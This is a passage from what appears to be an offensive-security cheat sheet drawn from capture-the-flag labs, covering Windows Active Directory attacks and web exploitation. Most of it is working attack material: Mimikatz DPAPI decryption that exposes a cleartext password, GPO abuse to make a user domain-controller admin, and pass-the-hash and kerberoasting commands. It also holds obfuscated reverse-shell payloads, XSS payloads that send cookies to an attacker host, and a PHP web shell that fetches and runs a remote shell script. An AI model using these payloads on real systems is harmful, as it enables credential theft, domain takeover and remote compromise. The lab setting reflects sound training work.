  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

[domainkey] with RPC
[DC] '<domain>' will be the domain
[DC] 'DC.<domain>' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77

```

Use the `dpapi::masterkey` module to decrypt and display the contents of the DPAPI (Data Protection API) Master Key under the specified path:

```shell
mimikatz # dpapi::cache

CREDENTIALS cache
=================

MASTERKEYS cache
================
GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77

DOMAINKEYS cache
================
```

```shell
mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0
```

Successfully obtained the password `H4ppyFtW183#` and tried to log in using winrm.

```shell
$ evil-winrm -i <host> -u HHogan -p 'H4ppyFtW183#'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami
office\hhogan
```

Next, look for a way to escalate privileges. First upload Bloodhound to get the entire AD idea.

```shell
$ bloodhound-python -c ALL -u tstark -p 'playboy69' -d <domain> -dc dc.<domain> -ns <host>
```

From the above figure, you can see that `HHogan@<domain>` points to another group `GPO Managers@<domain>` and is marked with `MemberOf`, indicating that HHogan is a member of this group. As a member of the `GPO Managers` group, HHogan user May be granted permission to modify, create or link Group Policy objects, because `GPO Managers@<domain>` This group is a security group in AD and usually contains users with permissions to manage Group Policy objects (GPOs). Analysis can use it To perform lateral movement of GPO permissions, first enter this command to list the display names of all GPOs in the current Active Directory environment. You can refer to this article `https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/gpo-abuse`.

```shell
*Evil-WinRM* PS C:\Users\HHogan\Documents> Get-GPO -All | Select-Object -ExpandProperty DisplayName
Windows Firewall GPO
Default Domain Policy
Default Active Directory Settings GPO
Default Domain Controllers Policy
Windows Update GPO
Windows Update Domain Policy
Software Installation GPO
Password Policy GPO
```

Then use the `SharpGPOAbuse.exe` tool in the Active Directory environment by modifying the `Default Domain Controllers Policy` group policy object to add the HHogan user account as a local administrator for all domain controllers affected by this GPO. This allows the HHogan user to obtain Advanced access to these domain controllers.

```shell
$ wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
```

Upload `SharpGPOAbuse.exe` and modifying the `Default Domain Controllers Policy` group policy object to add the HHogan user account as a local administrator for all domain controllers:

```shell
*Evil-WinRM* PS C:\Users\HHogan> upload /opt/htb/office/SharpGPOAbuse.exe

Info: Uploading /opt/htb/office/SharpGPOAbuse.exe to C:\Users\HHogan\SharpGPOAbuse.exe

Data: 107860 bytes of 107860 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\HHogan> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Controllers Policy"
[+] Domain = <domain>
[+] Domain Controller = DC.<domain>
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Controllers Policy" is: {6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] File exists: \\<domain>\SysVol\<domain>\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

Enter this command to force an immediate update of the group policy settings, and then check the hhogan user attributes in the admin:

```shell
*Evil-WinRM* PS C:\Users\HHogan> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.


*Evil-WinRM* PS C:\Users\HHogan> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
HHogan
The command completed successfully.
```

After confirming that you are in the admin group, reconnect with `winrm` and get the root flag:

```shell
$ evil-winrm -i <host> -u HHogan -p 'H4ppyFtW183#'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
HHogan
The command completed successfully.
```

### MSSQL

Connect to MS SQL database and check dir content:

```shell
impacket-mssqlclient -p 1433 -dc-ip <host> DOMAIN/Operator:operator@<host> -windows-auth

SQL (MANAGER\Operator  guest@master)> xp_dirtree "C:\inetpub\wwwroot\",0,1;
```

### ntpdate

Sync time with domain controller:

```shell
sudo ntpdate -s dc01.<host>
```

### powerview

Manual enumeration with powerview can see the permissions:

```shell
faketime -f +7h impacket-getTGT <domain>/ldap_monitor:'PASSWORD'

export KRB5CCNAME=./ldap_monitor.ccache

faketime -f +7h python3 powerview.py <domain>/ldap_monitor@IP -k --no-pass --dc-ip IP --use-ldaps
[2024-02-07 21:49:23] LDAP Signing NOT Enforced!
(LDAPS)-[IP]-[rebound\ldap_monitor]
PV > Get-ObjectAcl -Identity SERVICEMGMT
```

### psexec

Connection principle: It is to upload a binary file to the target machine `C:\Windows` directory through the pipeline and create a service on the remote target machine. Then run the binary file through the service, and delete the service and the binary file after running. As it will backtrack the attack process through logs when the attack is traced. The script will be checked by antivirus software when executing the uploaded binary file. (For example, the following example uploaded lfLHJWHE.exe with the service name Zeno, all randomly generated.)

Connection conditions: open port 445, any writable share for `IPC$` and `non-IPC$`. Because psexec has to write binary files to the target host. By default `C$` and admin$ are on.

```shell
psexec.py DOMAIN/administrator@dc01.<host> -hashes HASH
```

### Rubeus

Rubeus has a nopreauth parameter that can use the known username to perform Kerberoasting.

```shell
..\Rubeus-master\Rubeus\bin\Debug> .\Rubeus.exe kerberoast /nopreauth:username /domain:DOMAIN.COM /dc:dc01.DOMAIN.COM /ldaps /spns:users.txt /nowrap
```

### RunasCs

Getting reverse shell via `RunasCs`:

```shell
.\RunasCs.exe USERNAME PASSWORD cmd.exe -r REMOTE_IP:4444
```

> [antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs): RunasCs - Csharp and open version of windows builtin runas.exe

### smbexec

Connection Principle: Similar to psexec, it creates a service on the remote system through file sharing, writes the command to be run through the service in a bat file to execute it, then writes the execution result in a file to get the output of the executed command, and finally deletes the bat file, the output file and the service. While this technique may help to evade AV, the creation or deletion of services generates a lot of logs, so it is easy to trace back.

By default the script uses UTF-8 encoding, while most domestic machines use the default GBK encoding, which will result in a messy display back, you can use the -codec parameter to specify the GBK encoding. eg: `python3 smbexec.py administrator:root@<host> -codec gbk (demo) plaintext password, same for hash`)

Sometimes you need to specify another share to connect to if the default C$ share is not enabled. The command to connect to the admin$ share is as follows: `python3 smbexec.py administrator:root@<host> -codec gbk -share admin$`.

```shell
smbexec.py DOMAIN/administrator@dc01.<host> -hashes HASH
```

### wmiexec.py

The script mainly uses WMI for command execution and does the best job of evading AV checks.

```shell
wmiexec.py DOMAIN/administrator@dc01.<host> -hashes HASH
```

## XSS

**[`^        back to top        ^`](#overview)**

Bypass a regex filter to execute SSTI RCE with use the `%0A` char. Here is a payload:

```shell
category1=a///A77ss/e%0A;<%25%3d+system("echo IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvPGhvc3Q+LzQ0NDQgMD4mMSIK | base64 -d | bash")+%25>+
```
---
XSS attack on User-Agent and message `<img src=x onerror=fetch('http://REMOTE_IP:REMOTE_PORT/'+document.cookie);>` in Burp Suite on `/support` page:

```shell
POST /support HTTP/1.1
Host: <host>:5000
Content-Length: 140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://<host>:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src=x onerror=fetch('http://REMOTE_IP:REMOTE_PORT/'+document.cookie);>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<host>:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

fname=Test&lname=Test2&email=test%40test.com&phone=0333333333&message=Test;<img src=x onerror=fetch('http://REMOTE_IP:REMOTE_PORT/'+document.cookie);>
```

Get the cookie after send above request:

```shell
php -S 0.0.0.0:8081
[Sun Mar 24 12:06:58 2024] PHP 8.2.12 Development Server (http://0.0.0.0:8081) started
[Sun Mar 24 12:11:18 2024] <host>:38620 Accepted
[Sun Mar 24 12:11:18 2024] <host>:38620 [404]: GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 - No such file or directory
[Sun Mar 24 12:11:18 2024] <host>:38620 Closing
```
---
XSS Payload for message text box:

```shell
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function() {
const res = axios.get(`/user/api/chat`); const socket = io('/',{withCredentials: true}); socket.on('message', (my_message) => {fetch("http://<host>/?d=" + btoa(my_message))}) ; socket.emit('client_message', 'history');
});
```

```shell
<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE2LjE0Lz9kPSIgKyBidG9hKG15X21lc3NhZ2UpKX0pIDsgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7Cg=="));' />
```
---
In web-browser click: `Inspect -> Storage -> Cookies - Replace to`:

```shell
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg=="|base64${IFS}-d|bash;
```
Reverse shell:

```shell
$ echo "sh -i >& /dev/tcp/<host>/4444 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg==
```

---

```shell
<a href="http://<host>/<script+src='/vendor/analytics.min.js'></script><script+src='/assets/js/analytics.min.js?v=document.location=`http://REMOTE)IP:4444/${document.cookie}`'</script>" id="send-message">
```

Start python service and get cookies in the chat window `http://support.<host>`:

```shell
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
<host> - - [29/Dec/2023 12:50:21] code 404, message File not found
<host> - - [29/Dec/2023 12:50:21] "GET /CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MSwibmFtZSI6Ikp1bGlvIiwic3VybmFtZSI6IkRhbmllbCIsImVtYWlsIjoiSnVsaW8uRGFuaWVsQGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MDM4NDcwMDYsImV4cCI6MTcwMzkzMzQwNn0.wC7OZGED72dUFXhIVvRu88L2qZZoJRUwINdO3aXwOec HTTP/1.1" 404 -
```

There is cors here, and the cookie is used to log in to the `http://people.<host>/auth/login` subdomain. Set cookie and open `http://people.<host>/`.

---

Save game and add:

```shell
&nickname=<?php+system($_GET['cmd']);?>
```

After setting nickname as the parameter and PHP shell as its value, I attempted to export the file with a .php extension. In this case, when I opened it with the `cmd=id` parameter

Data has been saved in exports/top_players_a3pitdu4.php. Going to: `http://<host1>/exports/top_players_a3pitdu4.php?cmd=id`

```shell
Nickname 	Clicks 	Level
uid=33(www-data) gid=33(www-data) groups=33(www-data) 	714 	2
admin 	999999999999999999 	999999999
ButtonLover99 	10000000 	100
Paol 	2776354 	75
Th3Br0 	87947322 	1
```

Create shell.sh:

```shell
#!/bin/sh
bash -i >& /dev/tcp/<host>/4444 0>&1
```

Run http server:

```shell
python -m http.server 8001
```

Going to: `http://<host1>/exports/top_players_a3pitdu4.php?cmd=curl%20http://<host>:8001/shell.sh%20|%20bash`